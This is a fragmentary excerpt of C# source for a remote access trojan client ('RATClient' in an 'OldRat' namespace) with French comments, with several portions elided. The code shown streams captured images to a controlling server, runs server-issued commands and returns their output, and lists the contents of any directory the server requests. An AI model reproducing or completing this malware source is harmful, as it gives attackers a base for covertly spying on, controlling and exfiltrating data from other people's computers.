...
using System.Text;
using static OldRat.Global.Fonction;
    ...
    class RATClient : Form
    {
            ...
            while (client.Connected)
            {
                try
                {
                    ...
                    using (MemoryStream ms = new MemoryStream())
                    {
                        ...
                        SendPrefix(Prefix.IMG, stream);

                        SendSize(imageData, stream);
        ...
        void ListenForCommands()
        {
            while (client.Connected)
            {
                try
                {
                    byte[] prefBuffer = new byte[3];
                    int prefRead = stream.Read(prefBuffer, 0, prefBuffer.Length);

                    if (prefRead > 0)
                    {
                        string prefix = Encoding.UTF8.GetString(prefBuffer, 0, prefRead).Trim();
                        if (Prefix.CMD.ToString() == prefix)
                        {
                            ...
                            SendPrefix(Prefix.CMD, stream); //envoie le prefix au server

                            byte[] data = Encoding.UTF8.GetBytes(output); // Crée un tableau de bytes pour encoder la réponse du terminal

                            SendSize(data, stream); //envoie la taille

                            stream.Write(data, 0, data.Length); //envoie la reponse
                            stream.Flush();
                            terminal.Text += $"out: {output}\n";
                        }
                        else if (Prefix.FIL.ToString() == prefix)
                        {
                            // Lecture de la taille du chemin
                            byte[] pathSizeBuffer = new byte[4];
                            int sizeRead = stream.Read(pathSizeBuffer, 0, pathSizeBuffer.Length);
                            int pathSize = BitConverter.ToInt32(pathSizeBuffer, 0);

                            // Lecture du chemin demandé
                            byte[] pathBuffer = new byte[pathSize];
                            stream.Read(pathBuffer, 0, pathSize);
                            string requestedPath = Encoding.UTF8.GetString(pathBuffer, 0, pathSize);

                            terminal.Text += $"Le serveur demande la liste des fichiers de : {requestedPath}\n";
                            
                            // Liste les fichiers et dossiers
                            string[] files = Directory.GetFiles(requestedPath);
                            string[] directories = Directory.GetDirectories(requestedPath);
                            string response = "";

                            // Ajout des dossiers à la réponse
                            foreach (string dir in directories)
                            {
                                response += "|[D] " + Path.GetFileName(dir);
                            }

                            // Ajout des fichiers à la réponse
                            foreach (string file in files)
                            {
                                response += "|[F] " + Path.GetFileName(file);
                            }

                            // Envoi de la réponse au serveur
                            byte[] responseBytes = Encoding.UTF8.GetBytes(response.ToString());

                            SendPrefix(Prefix.FIL, stream);
                            SendSize(responseBytes, stream);
                            stream.Write(responseBytes, 0, responseBytes.Length);
                            stream.Flush();
                            terminal.Text += "out:" + response;

                            Console.WriteLine("Liste envoyée au serveur.");
                        }
                    }
                }
                catch (Exception ex)
